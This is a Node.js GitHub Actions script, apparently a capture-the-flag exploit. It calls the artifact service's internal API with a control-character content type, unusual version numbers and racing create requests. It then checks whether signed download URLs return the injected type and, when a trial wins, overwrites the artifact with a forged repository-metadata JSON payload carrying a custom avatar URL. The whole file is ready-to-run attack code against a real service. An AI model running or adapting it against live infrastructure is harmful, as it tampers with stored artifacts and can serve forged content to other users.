// Place in artifact-action/index.mjs and run as a Node 24 JavaScript action.
// Requires @actions/artifact and @azure/storage-blob installed in repo root.
// Prints no credentials or signed URLs.
import https from 'node:https';
import {createHash} from 'node:crypto';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from './node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from './node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from './node_modules/@actions/artifact/lib/generated/index.js';

const ids = getBackendIdsFromToken();
const odd = '\u0085application/json';
const initial = Buffer.from('{"probe":"compact"}');
const digest = StringValue.create({value: `sha256:${createHash('sha256').update(initial).digest('hex')}`});
const portrait = process.env.PORTRAIT_URL ||
  'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+/lqkAAAAASUVORK5CYII=';
const codepoints = x => Array.from(x || '', c => c.codePointAt(0));
const client = () => internalArtifactTwirpClient({maxAttempts: 1});

async function create(name, version, mime) {
  try {
    return (await client().CreateArtifact({...ids, name, version,
      mimeType: StringValue.create({value: mime})})).signedUploadUrl;
  } catch { return ''; }
}
async function upload(url, body) {
  if (!url) return false;
  try {
    await new BlobClient(url).getBlockBlobClient().uploadData(body, {
      blobHTTPHeaders: {blobContentType: odd},
    });
    return true;
  } catch { return false; }
}
async function finalize(name) {
  try { return String((await client().FinalizeArtifact({...ids, name,
    size: String(initial.length), hash: digest})).artifactId); }
  catch { return ''; }
}
async function signed(name) {
  try {
    const url = (await client().GetSignedArtifactURL({...ids, name})).signedUrl;
    return {url, rsct: new URL(url).searchParams.get('rsct') || ''};
  } catch { return {url: '', rsct: ''}; }
}
async function responseType(url) {
  if (!url) return '';
  return new Promise(resolve => {
    const req = https.get(url, {timeout: 12000}, res => {
      const value = res.statusCode === 200 ? res.headers['content-type'] || '' : '';
      res.resume();
      res.on('end', () => resolve(value));
    });
    req.on('timeout', () => req.destroy());
    req.on('error', () => resolve(''));
  });
}

async function attempt(mode, i) {
  const name = `ctf-compact-${process.env.GITHUB_RUN_ID}-${mode}-${i}`;
  const urls = mode === 'empty'
    ? [await create(name, 7, '')]
    : mode === 'version'
    ? [await create(name, i, odd)]
    : await Promise.all(i % 2
      ? [create(name, 7, 'application/json'), create(name, 6, odd)]
      : [create(name, 6, odd), create(name, 7, 'application/json')]);
  await Promise.all(urls.map(url => upload(url, initial)));
  const id = await finalize(name);
  const view = await signed(name);
  const observed = view.rsct.includes('\u0085') || !view.rsct
    ? await responseType(view.url) : '';
  const winner = Boolean(id && observed === odd);
  let carrierWrites = [];
  let repository = '';
  if (winner) {
    repository = `${process.env.GITHUB_REPOSITORY}/actions/artifacts/${id}/zip`;
    const body = Buffer.from(JSON.stringify({full_name: repository,
      owner: {login: 'cassette', avatar_url: portrait},
      description: 'Repo Cassette artifact', stargazers_count: 0}));
    carrierWrites = await Promise.all(urls.map(url => upload(url, body)));
  }
  console.log('PROBE', JSON.stringify({mode, i, created: urls.filter(Boolean).length,
    finalized: Boolean(id), id, sameUploadUrl: urls.length === 2 && urls[0] === urls[1], uploadExtensions: urls.map(url => url ? new URL(url).pathname.split('.').at(-1) : ''), rsct: codepoints(view.rsct),
    contentType: codepoints(observed), winner, carrierWrites, repository}));
  return winner;
}

let wins = 0;
wins += Number(await attempt('empty', 0));
for (const version of [6, 7, 8, 9, 255, -1, 2147483647]) {
  wins += Number(await attempt('version', version));
}
for (let i = 0; i < 8; i++) wins += Number(await attempt('race', i));
console.log('SUMMARY', JSON.stringify({trials: 16, wins}));
